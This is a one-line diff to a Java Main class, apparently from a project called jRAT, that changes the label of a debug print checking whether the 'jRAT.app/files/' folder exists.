@@ -48,7 +48,7 @@ public class Main {
 		if (argsContains(args, "-locinfo")) {
 			System.out.println(System.getProperty("user.dir"));
 			System.out.println("jRAT.app: " + new File("jRAT.app/").exists());
-			System.out.println("/files/: " + new File("jRAT.app/files/").exists());
+			System.out.println("jRAT.app/files/: " + new File("jRAT.app/files/").exists());
 		}
 		
 		if (argsContains(args, "-nossl")) {
